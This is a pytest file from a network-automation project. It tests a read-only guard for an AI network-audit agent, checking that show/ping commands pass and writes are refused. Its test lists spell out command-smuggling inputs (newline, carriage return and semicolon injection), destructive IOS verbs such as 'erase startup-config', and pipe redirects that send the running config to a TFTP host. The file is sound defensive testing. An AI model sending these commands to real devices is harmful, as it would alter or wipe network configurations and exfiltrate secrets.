# ============================================================
# Module:       tests/test_read_path_guard.py
# Purpose:      Pin command-level read-only enforcement (spec principle 1,
#               conformance C2): the read path allows exactly one show/ping/
#               traceroute command and refuses everything else BEFORE it can
#               reach the wire. Covers the newline/CR/separator/redirect
#               smuggling that a first-line-only blocklist missed (issue #16).
# Usage:        pytest tests/test_read_path_guard.py
# Dependencies: pytest (netmiko is not exercised -- _conn is faked)
# Author:       G Talks Tech
# GitHub:       github.com/GTalksTech/hardrails
# Notes:        Public by design. No credentials, no secrets.
# ============================================================
"""The read path must be read-only, enforced on the command itself.

`run_show` is a READ tool: the boundary lets it run without an approval, so the
command-level guard IS the enforcement. These tests drive `run_show` with a
fake connection and assert two things for every refusal: the call raises
`WriteAttemptOnReadPath`, AND nothing was handed to `send_command` -- the block
happens before the wire, not after.
"""

from __future__ import annotations

import pytest

from netagent.devices import Device, DeviceConnection, WriteAttemptOnReadPath


class _FakeConn:
    """Records everything sent so a test can assert nothing reached the wire."""

    def __init__(self) -> None:
        self.sent: list[str] = []

    def send_command(self, command: str, **_kwargs: object) -> str:
        self.sent.append(command)
        return f"<output for {command!r}>"


def _connected() -> tuple[DeviceConnection, _FakeConn]:
    conn = DeviceConnection(Device({"hostname": "core-rtr-01", "host": "10.0.0.1"}))
    fake = _FakeConn()
    conn._conn = fake  # bypass connect(): we are testing the command guard only
    return conn, fake


# Commands a network-audit agent legitimately issues on the read path.
_ALLOWED = [
    "show version",
    "show running-config",
    "show ip interface brief",
    "ping 10.0.0.1",
    "traceroute 10.0.0.1",
    "show running-config | include secret",  # filter pipe is a read, allowed
    "show ip route | section bgp",
    "show run | exclude !",                  # the full filter allowlist...
    "show run | begin interface",
    "show run | count line",
    "show run | include bgp | exclude neighbor",  # ...incl. chained filters
]

# Single-token / single-line writes and state-changing EXEC verbs. None of these
# is a permitted read verb, so the allowlist refuses them.
_BLOCKED_SIMPLE = [
    "configure terminal",
    "conf t",
    "no ip http server",
    "write memory",
    "wr",
    "wr mem",
    "copy running-config startup-config",
    "reload",
    "clear ip bgp *",
    "clear counters",
    "interface GigabitEthernet0/0",
    "debug ip packet",
    "debug all",
    "tclsh",
    "default interface Gi0/0",
    "erase startup-config",
]

# The bypass matrix: a legitimate read verb up front, a smuggled command behind
# a newline / CR / separator, or an output redirect that writes to the device.
_BLOCKED_SMUGGLED = [
    "show version\nconfigure terminal",
    "show running-config\nconf t\ninterface Gi0/0\n shutdown",
    "show version ; conf t",
    "show ip interface brief\rno ip http server",
    "show running-config | redirect flash:pwn.txt",
    "show run | tee flash:leak.txt",
    "show run | append flash:leak.txt",
]

# The abbreviation matrix (issue #35): IOS accepts minimum-unique abbreviations
# for output modifiers, so a write-target *blocklist* of full words missed these.
# A filter *allowlist* refuses anything after `|` that is not a known read
# filter, full word -- so every abbreviated redirect/tee/append is refused, and a
# redirect hidden behind a legal filter (chained pipe) is caught too. Remote
# destinations make the leak an off-box exfiltration, not just a local write.
_BLOCKED_PIPE = [
    "show running-config | red flash:pwn.txt",       # redirect -> red
    "show run | redi flash:pwn.txt",
    "show run | redir tftp://10.0.0.9/cfg",
    "show running-config | red tftp://10.0.0.9/cfg",  # off-box exfiltration
    "show run | te flash:leak.txt",                   # tee -> te
    "show run | a flash:leak.txt",                    # append -> a
    "show run | ap flash:leak.txt",
    "show run | section bgp | red flash:x",           # filter THEN abbrev redirect
    "show run | include bgp | tee flash:x",
    "show run | i secret",                            # abbreviated FILTER also refused
    "show run | format",                              # unrecognized modifier fails closed
]


class TestAllowedReadsReachTheWire:
    @pytest.mark.parametrize("command", _ALLOWED)
    def test_permitted_read_is_sent(self, command: str) -> None:
        conn, fake = _connected()
        out = conn.run_show(command)
        assert fake.sent == [command]  # exactly this command reached send_command
        assert "output for" in out


class TestWritesAreRefusedBeforeTheWire:
    @pytest.mark.parametrize("command", _BLOCKED_SIMPLE)
    def test_write_verb_refused(self, command: str) -> None:
        conn, fake = _connected()
        with pytest.raises(WriteAttemptOnReadPath):
            conn.run_show(command)
        assert fake.sent == []  # nothing reached the wire

    @pytest.mark.parametrize("command", _BLOCKED_SMUGGLED)
    def test_smuggled_command_refused(self, command: str) -> None:
        conn, fake = _connected()
        with pytest.raises(WriteAttemptOnReadPath):
            conn.run_show(command)
        assert fake.sent == []  # the smuggled write never reaches send_command

    @pytest.mark.parametrize("command", _BLOCKED_PIPE)
    def test_pipe_write_or_abbreviation_refused(self, command: str) -> None:
        conn, fake = _connected()
        with pytest.raises(WriteAttemptOnReadPath):
            conn.run_show(command)
        assert fake.sent == []  # the redirect never reaches send_command


class TestGuardShape:
    def test_empty_command_is_refused(self) -> None:
        conn, fake = _connected()
        with pytest.raises(WriteAttemptOnReadPath):
            conn.run_show("   ")
        assert fake.sent == []

    def test_unknown_verb_is_refused_by_the_allowlist(self) -> None:
        # Not a write per se, but not a known read verb either -> refused.
        conn, fake = _connected()
        with pytest.raises(WriteAttemptOnReadPath):
            conn.run_show("banana --now")
        assert fake.sent == []

    def test_abbreviated_show_is_refused_send_the_full_verb(self) -> None:
        # The agent surface emits the full verb; abbreviations are refused so the
        # allowlist stays unambiguous (prefer a false positive over a bypass).
        conn, fake = _connected()
        with pytest.raises(WriteAttemptOnReadPath):
            conn.run_show("sh run")
        assert fake.sent == []
